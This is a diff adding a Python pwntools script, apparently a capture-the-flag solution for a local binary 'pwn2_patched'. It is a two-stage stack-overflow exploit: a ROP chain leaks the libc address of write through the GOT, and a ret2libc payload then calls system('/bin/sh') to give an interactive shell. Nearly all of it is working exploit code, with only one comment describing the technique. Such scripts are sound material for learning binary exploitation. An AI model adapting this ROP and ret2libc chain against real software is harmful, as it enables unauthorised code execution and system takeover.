@@ -1,0 +1,36 @@
+from pwn import *
+
+# use ret2main, stage 1 use ROP to leak libc base through GOT table then stage 2 is normal ret2libc after calculated system and binsh address
+
+p = process("./pwn2_patched")
+e = ELF("./pwn2_patched")
+libc = ELF("./libc-2.28.so")
+r = ROP(e)
+
+write_got = e.got['write']
+write_plt = e.plt['write']
+vuln = e.symbols['vuln']
+pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
+ret = pop_rdi + 1
+
+payload = b'A' * 0x80 + b'B' * 0x8
+payload += p64(pop_rdi) + p64(1)
+payload += p64(pop_rsi_r15) + p64(write_got) + p64(0)
+payload += p64(write_plt)
+payload += p64(vuln)
+
+p.recv()
+p.sendline(payload)
+write = u64(p.recvn(6)+b'\x00'*2) #
+print(hex(write))
+lb = write - libc.symbols['write']
+system = lb + libc.symbols['system']
+binsh = lb + list(libc.search(b'/bin/sh'))[0]
+
+payload = b'A' * 0x80 + b'B' * 0x8
+payload += p64(pop_rdi) + p64(binsh)
+#payload += p64(ret)
+payload += p64(system)
+p.sendline(payload)
+p.interactive()
